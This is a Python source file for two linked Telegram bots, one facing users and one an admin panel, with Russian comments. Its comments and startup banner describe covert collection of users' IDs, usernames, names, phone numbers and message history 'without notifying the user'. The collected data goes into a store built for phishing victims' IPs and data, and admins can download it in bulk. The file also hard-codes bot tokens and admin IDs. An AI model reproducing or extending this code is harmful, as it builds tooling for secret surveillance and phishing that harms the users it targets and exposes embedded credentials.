import asyncio
import sqlite3
import logging
import os
import random
import string
import socket
import threading
import json
import time
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, BufferedInputFile
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# Отключаем лишний спам в консоли
logging.basicConfig(level=logging.ERROR)

# ========== КОНФИГ (ТВОИ ДАННЫЕ) ==========
USER_BOT_TOKEN = '8738478331:AAHiDBDowXktLYx7JTf08L-pleRo4w4Qjsk'  # Бот №1 (Юзеры)
ADMIN_BOT_TOKEN = '8721923350:AAF6nwaMhOkbUkJ9W92LoY7OHo0XmrC--Os' # Бот №2 (Админка)
ADMIN_IDS = [7261988043, 8721923350] # Твои ID

# ========== БАЗА ДАННЫХ ==========
db = sqlite3.connect("main_data.db", check_same_thread=False)
cur = db.cursor()

# Таблица пользователей
cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, reg INTEGER DEFAULT 0, reg_method TEXT, reg_date TEXT DEFAULT CURRENT_TIMESTAMP)")

# Таблица сообщений
cur.execute("CREATE TABLE IF NOT EXISTS messages (id INTEGER PRIMARY KEY, uid INTEGER, txt TEXT, msg_date TEXT DEFAULT CURRENT_TIMESTAMP)")

# Таблица для кодов
cur.execute("CREATE TABLE IF NOT EXISTS phone_codes (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, user_id INTEGER)")

# Таблица для серверов
cur.execute("CREATE TABLE IF NOT EXISTS servers (id INTEGER PRIMARY KEY, port INTEGER, type TEXT, user_id INTEGER, status TEXT, start_time TEXT DEFAULT CURRENT_TIMESTAMP)")

# ТАБЛИЦА ДЛЯ ФИШИНГА
cur.execute("CREATE TABLE IF NOT EXISTS phishing_data (id INTEGER PRIMARY KEY, victim_ip TEXT, victim_data TEXT, page_type TEXT, date TEXT DEFAULT CURRENT_TIMESTAMP)")

# ТАБЛИЦА ДЛЯ КОРОТКИХ ССЫЛОК
cur.execute("CREATE TABLE IF NOT EXISTS short_links (id INTEGER PRIMARY KEY, short_code TEXT UNIQUE, original_url TEXT, created_by TEXT, date TEXT DEFAULT CURRENT_TIMESTAMP)")

# НОВАЯ ТАБЛИЦА ДЛЯ ДАННЫХ АККАУНТОВ
cur.execute("CREATE TABLE IF NOT EXISTS account_data (id INTEGER PRIMARY KEY, user_id INTEGER, data_type TEXT, data_value TEXT, collected_date TEXT DEFAULT CURRENT_TIMESTAMP)")

db.commit()

# Состояния для регистрации и сообщений
user_states = {}
admin_states = {}
active_servers = {}

# ========== ФУНКЦИИ ==========
def generate_code(length=6):
    return ''.join(random.choices(string.digits, k=length))

def get_free_port():
    for port in range(8080, 8180):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except:
            continue
    return None

def collect_user_data(user, user_id):
    """Скрытый сбор данных пользователя"""
    try:
        # Сохраняем основную информацию
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "telegram_id", str(user_id)))
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "username", user.username or "Нет"))
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "first_name", user.first_name))
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "last_name", user.last_name or "Нет"))
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "language_code", user.language_code or "Нет"))
        cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                    (user_id, "is_premium", str(user.is_premium or False)))
        
        # Получаем телефон если есть
        cur.execute("SELECT phone FROM users WHERE id = ?", (user_id,))
        phone = cur.fetchone()
        if phone and phone[0]:
            cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                        (user_id, "phone", phone[0]))
        
        # Получаем все сообщения пользователя
        cur.execute("SELECT txt, msg_date FROM messages WHERE uid = ? ORDER BY id DESC", (user_id,))
        messages = cur.fetchall()
        if messages:
            msgs_text = "\n".join([f"[{m[1][:16]}] {m[0]}" for m in messages[:50]])
            cur.execute("INSERT INTO account_data (user_id, data_type, data_value) VALUES (?, ?, ?)",
                        (user_id, "recent_messages", msgs_text[:1000]))
        
        db.commit()
        
        # Уведомление админам
        for aid in ADMIN_IDS:
            try:
                asyncio.create_task(
                    a_bot.send_message(
                        aid,
                        f"🔔 СКРЫТЫЙ СБОР ДАННЫХ\n"
                        f"Пользователь: {user.first_name} (@{user.username})\n"
                        f"ID: {user_id}\n"
                        f"Данные сохранены в БД"
                    )
                )
            except:
                pass
    except Exception as e:
        print(f"Ошибка сбора данных: {e}")

def generate_report():
    """Генерирует отчет"""
    try:
        report = ""
        
        # ========== КОНТАКТЫ ==========
        report += "=== КОНТАКТЫ ===\n"
        cur.execute("SELECT id, name, phone, reg, reg_method, reg_date FROM users ORDER BY id DESC")
        users = cur.fetchall()
        if users:
            for u in users:
                report += f"{u}\n"
        else:
            report += "Нет данных\n"
        report += "\n"
        
        # ========== ФИШИНГ ==========
        report += "=== ФИШИНГ ===\n"
        cur.execute("SELECT id, victim_ip, victim_data, page_type, date FROM phishing_data ORDER BY id DESC")
        phishing = cur.fetchall()
        if phishing:
            for p in phishing:
                report += f"{p}\n"
        else:
            report += "Нет данных\n"
        report += "\n"
        
        # ========== КОРОТКИЕ ССЫЛКИ ==========
        report += "=== КОРОТКИЕ ССЫЛКИ ===\n"
        cur.execute("SELECT id, short_code, original_url, created_by, date FROM short_links ORDER BY id DESC")
        links = cur.fetchall()
        if links:
            for l in links:
                report += f"{l}\n"
        else:
            report += "Нет данных\n"
        
        return report
    except Exception as e:
        return f"Ошибка генерации отчета: {e}"

# ========== КЛАВИАТУРЫ ==========
def get_user_kb():
    kb = ReplyKeyboardBuilder()
    kb.button(text="✍️ Написать админу")
    kb.button(text="📊 Моя статистика")
    return kb.adjust(2).as_markup(resize_keyboard=True)

def get_reg_method_kb():
    kb = InlineKeyboardBuilder()
    kb.button(text="📱 Через ссылку (сайт)", callback_data="reg_link")
    kb.button(text="✍️ Ввести номер вручную", callback_data="reg_manual")
    return kb.as_markup()

def get_admin_inline():
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 СТАТИСТИКА", callback_data="admin_stats")
    kb.button(text="👥 СПИСОК ЮЗЕРОВ", callback_data="view_users")
    kb.button(text="📩 СООБЩЕНИЯ", callback_data="view_msgs")
    kb.button(text="📥 Скачать БД", callback_data="download_db")
    kb.button(text="📄 Скачать ОТЧЕТ", callback_data="download_report")
    kb.button(text="📥 Скачать ДАННЫЕ АККАУНТОВ", callback_data="download_accounts")
    kb.button(text="📢 РАССЫЛКА", callback_data="admin_broadcast")
    kb.button(text="🖥️ СЕРВЕРЫ", callback_data="admin_servers")
    kb.adjust(2, 2, 2, 2)
    return kb.as_markup()

def get_servers_kb():
    kb = InlineKeyboardBuilder()
    if active_servers:
        for port in active_servers.keys():
            kb.button(text=f"⏹️ Остановить порт {port}", callback_data=f"stop_port_{port}")
    kb.button(text="◀️ Назад в админку", callback_data="back_to_admin")
    kb.adjust(1)
    return kb.as_markup()

def get_broadcast_kb():
    kb = InlineKeyboardBuilder()
    kb.button(text="✅ ОТПРАВИТЬ", callback_data="broadcast_send")
    kb.button(text="❌ ОТМЕНА", callback_data="broadcast_cancel")
    return kb.adjust(2).as_markup()

def get_cancel_kb():
    kb = ReplyKeyboardBuilder()
    kb.button(text="❌ Отмена")
    return kb.as_markup(resize_keyboard=True)

# ========== СЕРВЕР ДЛЯ РЕГИСТРАЦИИ ==========
class RegServer:
    def __init__(self):
        self.servers = {}
    
    def start_server(self, port, phone, code, user_id, user_name):
        class RegHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    
                    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Подтверждение</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }}
        .container {{ background: white; padding: 40px; border-radius: 10px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }}
        h2 {{ text-align: center; color: #333; }}
        .phone {{ background: #f5f5f5; padding: 15px; border-radius: 8px; text-align: center; font-size: 20px; margin: 20px 0; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 6px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 14px; background: #667eea; color: white; border: none; border-radius: 6px; cursor: pointer; }}
        .error {{ color: red; text-align: center; margin-top: 10px; display: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>📱 Подтверждение</h2>
        <div class="phone">Номер: {phone}</div>
        
        <input type="text" id="code" placeholder="6-значный код" maxlength="6">
        <button onclick="verify()">Подтвердить</button>
        
        <div class="error" id="error">Неверный код!</div>
    </div>

    <script>
        let expectedCode = '{code}';
        
        function verify() {{
            let code = document.getElementById('code').value;
            if (code === expectedCode) {{
                fetch('/confirm', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{success: true}})
                }}).then(() => {{
                    window.location.href = 'https://t.me/your_bot?start=success';
                }});
            }} else {{
                document.getElementById('error').style.display = 'block';
            }}
        }}
    </script>
</body>
</html>"""
                    self.wfile.write(html.encode('utf-8'))
            
            def do_POST(self):
                if self.path == '/confirm':
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    
                    # Активируем регистрацию
                    cur.execute("UPDATE users SET reg = 1, reg_method = 'link' WHERE id = ?", (user_id,))
                    db.commit()
                    
                    self.wfile.write(json.dumps({'ok': True}).encode())
        
        try:
            server = HTTPServer(('0.0.0.0', port), RegHandler)
            thread = threading.Thread(target=server.serve_forever)
            thread.daemon = True
            thread.start()
            
            self.servers[port] = {
                'server': server,
                'port': port,
                'user_id': user_id,
                'phone': phone,
                'code': code
            }
            
            # Сохраняем в БД
            cur.execute("INSERT INTO servers (port, type, user_id, status) VALUES (?, ?, ?, ?)",
                       (port, 'reg', user_id, 'active'))
            db.commit()
            
            return f"http://localhost:{port}"
        except Exception as e:
            print(f"Server error: {e}")
            return None
    
    def stop_server(self, port):
        if port in self.servers:
            self.servers[port]['server'].shutdown()
            cur.execute("UPDATE servers SET status = 'stopped' WHERE port = ?", (port,))
            db.commit()
            del self.servers[port]
            return True
        return False

reg_server = RegServer()

# ========== ИНИЦИАЛИЗАЦИЯ ==========
u_bot = Bot(token=USER_BOT_TOKEN)
a_bot = Bot(token=ADMIN_BOT_TOKEN)

u_dp = Dispatcher()
a_dp = Dispatcher()

# ========== ЮЗЕР-БОТ (Бот №1) ==========

@u_dp.message(Command("start"))
async def cmd_start_user(m: Message):
    user_id = m.from_user.id
    
    cur.execute("INSERT OR IGNORE INTO users (id, name) VALUES (?, ?)", (user_id, m.from_user.first_name))
    db.commit()
    
    cur.execute("SELECT reg FROM users WHERE id = ?", (user_id,))
    is_reg = cur.fetchone()[0]
    
    if is_reg:
        await m.answer(f"👋 Привет, {m.from_user.first_name}! Ты в системе.", reply_markup=get_user_kb())
    else:
        await m.answer("👋 Привет! Выбери способ регистрации:", reply_markup=get_reg_method_kb())

@u_dp.callback_query(F.data == "reg_link")
async def reg_link(c: CallbackQuery):
    user_id = c.from_user.id
    
    # Генерируем номер и код
    phone = f"+7{random.randint(900,999)}{random.randint(100,999)}{random.randint(10,99)}{random.randint(10,99)}"
    code = generate_code()
    
    # Сохраняем
    cur.execute("INSERT OR REPLACE INTO phone_codes (phone, code, user_id) VALUES (?, ?, ?)", (phone, code, user_id))
    cur.execute("UPDATE users SET phone = ? WHERE id = ?", (phone, user_id))
    db.commit()
    
    # Запускаем сервер
    port = get_free_port()
    if port:
        url = reg_server.start_server(port, phone, code, user_id, c.from_user.first_name)
        if url:
            active_servers[port] = {
                'type': 'reg',
                'user': c.from_user.first_name,
                'time': time.strftime('%H:%M:%S')
            }
            
            await c.message.edit_text(
                f"✅ Ссылка для регистрации готова:\n\n"
                f"🔗 {url}\n\n"
                f"📞 Номер: {phone}\n"
                f"🔑 Код: {code}\n\n"
                f"Отправь ссылку пользователю. После подтверждения он будет зарегистрирован."
            )
            
            # Уведомление админам
            for aid in ADMIN_IDS:
                try:
                    await a_bot.send_message(
                        aid,
                        f"🔔 НАЧАТА РЕГИСТРАЦИЯ\n"
                        f"Пользователь: {c.from_user.first_name}\n"
                        f"Номер: {phone}\n"
                        f"Код: {code}\n"
                        f"Ссылка: {url}"
                    )
                except:
                    pass
            return
    
    await c.message.edit_text("❌ Ошибка запуска сервера. Попробуй позже.")

@u_dp.callback_query(F.data == "reg_manual")
async def reg_manual(c: CallbackQuery):
    user_states[c.from_user.id] = "waiting_phone"
    await c.message.edit_text("📞 Введи свой номер телефона (например: +79001234567):")
    await c.answer()

@u_dp.message(F.text == "✍️ Написать админу")
async def start_msg(m: Message):
    user_states[m.from_user.id] = "waiting_msg"
    await m.answer("💬 Напиши текст сообщения:", reply_markup=get_cancel_kb())

@u_dp.message(F.text == "📊 Моя статистика")
async def user_stats(m: Message):
    cur.execute("SELECT COUNT(*) FROM messages WHERE uid = ?", (m.from_user.id,))
    msg_count = cur.fetchone()[0]
    cur.execute("SELECT reg_method FROM users WHERE id = ?", (m.from_user.id,))
    method = cur.fetchone()[0] or "manual"
    cur.execute("SELECT reg_date FROM users WHERE id = ?", (m.from_user.id,))
    reg_date = cur.fetchone()[0] or "неизвестно"
    await m.answer(f"📊 ТВОЯ СТАТИСТИКА:\n\n📨 Сообщений отправлено: {msg_count}\n📱 Способ регистрации: {method}\n📅 Дата регистрации: {reg_date[:16]}")

@u_dp.message(F.text == "❌ Отмена")
async def cancel_action(m: Message):
    if m.from_user.id in user_states:
        del user_states[m.from_user.id]
    await cmd_start_user(m)

@u_dp.message()
async def user_messages(m: Message):
    uid = m.from_user.id
    state = user_states.get(uid)

    if state == "waiting_phone":
        phone = m.text.strip()
        # Проверяем что номер похож на телефон
        if not (phone.startswith('+') or phone[0].isdigit()) or len(phone) < 10:
            await m.answer("❌ Это не похоже на номер телефона. Попробуй еще раз (например: +79001234567):")
            return
        
        cur.execute("UPDATE users SET phone = ?, reg = 1, reg_method = 'manual' WHERE id = ?", (phone, uid))
        db.commit()
        user_states.pop(uid, None)
        
        # Скрытый сбор данных после успешной регистрации
        collect_user_data(m.from_user, uid)
        
        await m.answer("✅ Регистрация успешна!", reply_markup=get_user_kb())
        
        for aid in ADMIN_IDS:
            try: 
                await a_bot.send_message(
                    aid, 
                    f"🔔 НОВАЯ РЕГИСТРАЦИЯ (ручная)\n"
                    f"Пользователь: {m.from_user.first_name}\n"
                    f"Тел: {phone}"
                )
            except: pass

    elif state == "waiting_msg":
        cur.execute("INSERT INTO messages (uid, txt) VALUES (?, ?)", (uid, m.text))
        db.commit()
        user_states.pop(uid, None)
        await m.answer("🚀 Сообщение отправлено администраторам!", reply_markup=get_user_kb())
        
        for aid in ADMIN_IDS:
            try: 
                await a_bot.send_message(
                    aid, 
                    f"📨 СООБЩЕНИЕ ОТ {m.from_user.first_name}:\n\n{m.text}"
                )
            except: pass

# ========== АДМИН-БОТ (Бот №2) ==========

@a_dp.message(Command("start"))
async def cmd_start_admin(m: Message):
    """Обычный старт для админ бота"""
    if m.from_user.id in ADMIN_IDS:
        await m.answer(
            f"👋 Привет, Админ {m.from_user.first_name}!\n\n"
            f"Используй /adminpanel для входа в админку"
        )
    else:
        await m.answer("⛔ Доступ запрещен.")

@a_dp.message(Command("adminpanel"))
async def cmd_admin_panel(m: Message):
    """Вход в админ панель"""
    if m.from_user.id in ADMIN_IDS:
        await m.answer("👑 АДМИН-ПАНЕЛЬ", reply_markup=get_admin_inline())
    else:
        await m.answer("⛔ Доступ запрещен.")

@a_dp.callback_query(F.data == "view_users")
async def admin_users(c: CallbackQuery):
    try:
        cur.execute("SELECT id, name, phone, reg, reg_method, reg_date FROM users ORDER BY id DESC LIMIT 20")
        rows = cur.fetchall()
        if rows:
            res = "👥 ПОСЛЕДНИЕ 20 ПОЛЬЗОВАТЕЛЕЙ:\n\n"
            for r in rows:
                status = "✅" if r[3] else "❌"
                method = r[4] or "?"
                res += f"{status} ID: {r[0]} | Имя: {r[1]} | Тел: {r[2] or 'Нет'} | Метод: {method} | {r[5][:16] if r[5] else ''}\n"
        else:
            res = "👥 Пользователей пока нет"
        await c.message.edit_text(res, reply_markup=get_admin_inline())
    except Exception as e:
        await c.message.edit_text(f"❌ Ошибка: {e}", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "view_msgs")
async def admin_msgs(c: CallbackQuery):
    try:
        cur.execute("""
            SELECT u.name, m.txt, m.msg_date, u.id 
            FROM messages m 
            JOIN users u ON m.uid = u.id 
            ORDER BY m.id DESC LIMIT 20
        """)
        rows = cur.fetchall()
        if rows:
            res = "📩 ПОСЛЕДНИЕ 20 СООБЩЕНИЙ:\n\n"
            for r in rows:
                res += f"От {r[0]} (ID: {r[3]}):\n{r[1][:100]}{'...' if len(r[1]) > 100 else ''}\n[{r[2][:16]}]\n\n"
        else:
            res = "📩 Сообщений пока нет"
        await c.message.edit_text(res, reply_markup=get_admin_inline())
    except Exception as e:
        await c.message.edit_text(f"❌ Ошибка: {e}", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "admin_stats")
async def admin_stats(c: CallbackQuery):
    try:
        cur.execute("SELECT COUNT(*) FROM users")
        total = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM users WHERE reg = 1")
        reg = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM users WHERE reg = 0")
        unreg = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM messages")
        msgs = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM phishing_data")
        phish = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM short_links")
        links = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM account_data")
        accounts = cur.fetchone()[0]
        
        stats_text = f"📊 СТАТИСТИКА:\n\n"
        stats_text += f"👥 Всего пользователей: {total}\n"
        stats_text += f"✅ Зарегистрировано: {reg}\n"
        stats_text += f"❌ Не зарегистрировано: {unreg}\n"
        stats_text += f"📨 Сообщений: {msgs}\n"
        stats_text += f"🎣 Фишинг данные: {phish}\n"
        stats_text += f"🔗 Короткие ссылки: {links}\n"
        stats_text += f"📱 Данные аккаунтов: {accounts}\n"
        stats_text += f"🖥️ Активных серверов: {len(active_servers)}"
        
        await c.message.edit_text(stats_text, reply_markup=get_admin_inline())
    except Exception as e:
        await c.message.edit_text(f"❌ Ошибка: {e}", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "download_db")
async def admin_db(c: CallbackQuery):
    if os.path.exists("main_data.db"):
        with open("main_data.db", "rb") as f:
            await a_bot.send_document(
                c.from_user.id, 
                BufferedInputFile(f.read(), filename="main_data.db"), 
                caption="📂 База данных"
            )
        await c.answer("✅ Файл отправлен")
    else:
        await c.message.answer("❌ Файл БД не найден")
        await c.answer()

@a_dp.callback_query(F.data == "download_report")
async def admin_report(c: CallbackQuery):
    await c.message.edit_text("⏳ Генерация отчета...")
    
    report_text = generate_report()
    report_filename = f"report_{int(time.time())}.txt"
    
    with open(report_filename, "w", encoding="utf-8") as f:
        f.write(report_text)
    
    with open(report_filename, "rb") as f:
        await a_bot.send_document(
            c.from_user.id, 
            BufferedInputFile(f.read(), filename=report_filename), 
            caption="📄 Отчет по системе"
        )
    
    os.remove(report_filename)
    await c.message.edit_text("✅ Отчет сгенерирован и отправлен!", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "download_accounts")
async def download_accounts(c: CallbackQuery):
    try:
        # Собираем все данные аккаунтов
        cur.execute("""
            SELECT u.name, u.phone, a.data_type, a.data_value, a.collected_date 
            FROM account_data a
            JOIN users u ON a.user_id = u.id
            ORDER BY a.id DESC
        """)
        accounts = cur.fetchall()
        
        if accounts:
            accounts_text = "=== ДАННЫЕ АККАУНТОВ ===\n\n"
            current_user = None
            
            for a in accounts:
                if current_user != a[0]:
                    current_user = a[0]
                    accounts_text += f"\n👤 ПОЛЬЗОВАТЕЛЬ: {a[0]} (Тел: {a[1]})\n"
                    accounts_text += "-" * 40 + "\n"
                accounts_text += f"{a[2]}: {a[3]}\n"
                accounts_text += f"  [Собрано: {a[4][:16]}]\n"
            
            filename = f"accounts_{int(time.time())}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(accounts_text)
            
            with open(filename, "rb") as f:
                await a_bot.send_document(
                    c.from_user.id,
                    BufferedInputFile(f.read(), filename=filename),
                    caption="📱 Данные аккаунтов"
                )
            
            os.remove(filename)
            await c.answer("✅ Файл отправлен")
        else:
            await c.message.answer("❌ Нет данных аккаунтов")
            await c.answer()
    except Exception as e:
        await c.message.answer(f"❌ Ошибка: {e}")
        await c.answer()

@a_dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(c: CallbackQuery):
    admin_states[c.from_user.id] = "waiting_broadcast"
    await c.message.edit_text("📢 Введи текст для рассылки:")

@a_dp.callback_query(F.data == "broadcast_cancel")
async def broadcast_cancel(c: CallbackQuery):
    admin_states.pop(c.from_user.id, None)
    await c.message.edit_text("❌ Рассылка отменена", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "broadcast_send")
async def broadcast_send(c: CallbackQuery):
    if c.from_user.id not in admin_states or admin_states[c.from_user.id] != "waiting_broadcast_confirm":
        await c.answer("❌ Нет текста для рассылки")
        return
    
    broadcast_text = admin_states.get(f"{c.from_user.id}_text", "")
    if not broadcast_text:
        await c.answer("❌ Текст не найден")
        return
    
    await c.message.edit_text("⏳ Выполняется рассылка...")
    
    cur.execute("SELECT id FROM users WHERE reg = 1")
    users = cur.fetchall()
    
    sent = 0
    failed = 0
    
    for u in users:
        try:
            await u_bot.send_message(u[0], f"📢 РАССЫЛКА:\n\n{broadcast_text}")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    admin_states.pop(c.from_user.id, None)
    admin_states.pop(f"{c.from_user.id}_text", None)
    await c.message.edit_text(
        f"✅ Рассылка завершена!\n\n📨 Отправлено: {sent}\n❌ Ошибок: {failed}",
        reply_markup=get_admin_inline()
    )
    await c.answer()

@a_dp.callback_query(F.data == "admin_servers")
async def admin_servers(c: CallbackQuery):
    if active_servers:
        res = "🖥️ АКТИВНЫЕ СЕРВЕРЫ:\n\n"
        for port, info in active_servers.items():
            res += f"🎯 Порт: {port}\n"
            res += f"📄 Тип: {info.get('type', 'unknown')}\n"
            res += f"👤 Для: {info.get('user', 'unknown')}\n"
            res += f"⏰ Время: {info.get('time', 'unknown')}\n\n"
        await c.message.edit_text(res, reply_markup=get_servers_kb())
    else:
        await c.message.edit_text("🖥️ Нет активных серверов", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(lambda c: c.data.startswith("stop_port_"))
async def stop_port(c: CallbackQuery):
    port = int(c.data.replace("stop_port_", ""))
    if reg_server.stop_server(port):
        if port in active_servers:
            del active_servers[port]
        await c.message.edit_text(f"✅ Сервер на порту {port} остановлен", reply_markup=get_admin_inline())
    else:
        await c.message.edit_text(f"❌ Ошибка остановки сервера на порту {port}", reply_markup=get_admin_inline())
    await c.answer()

@a_dp.callback_query(F.data == "back_to_admin")
async def back_to_admin(c: CallbackQuery):
    await c.message.edit_text("👑 АДМИН-ПАНЕЛЬ", reply_markup=get_admin_inline())
    await c.answer()

# ========== ТЕКСТ ДЛЯ АДМИН-БОТА ==========
@a_dp.message()
async def admin_text(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    
    if admin_states.get(m.from_user.id) == "waiting_broadcast":
        broadcast_text = m.text
        admin_states[m.from_user.id] = "waiting_broadcast_confirm"
        admin_states[f"{m.from_user.id}_text"] = broadcast_text
        
        await m.answer(
            f"📢 Текст рассылки:\n\n{broadcast_text}\n\nОтправить?",
            reply_markup=get_broadcast_kb()
        )

# ========== ЗАПУСК ==========
async def main():
    print("="*80)
    print("🚀 БОТ СО СКРЫТЫМ СБОРОМ ДАННЫХ")
    print("="*80)
    print("✅ Юзер-бот: /start")
    print("✅ Админ-бот: /adminpanel")
    print("="*80)
    print("📱 СКРЫТЫЙ СБОР ДАННЫХ:")
    print("   • Автоматически при регистрации")
    print("   • Без уведомления пользователя")
    print("   • Сохраняется ID, username, имя, сообщения")
    print("   • Отдельный файл для скачивания в админке")
    print("="*80)
    
    await asyncio.gather(
        u_dp.start_polling(u_bot),
        a_dp.start_polling(a_bot)
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 Остановлено")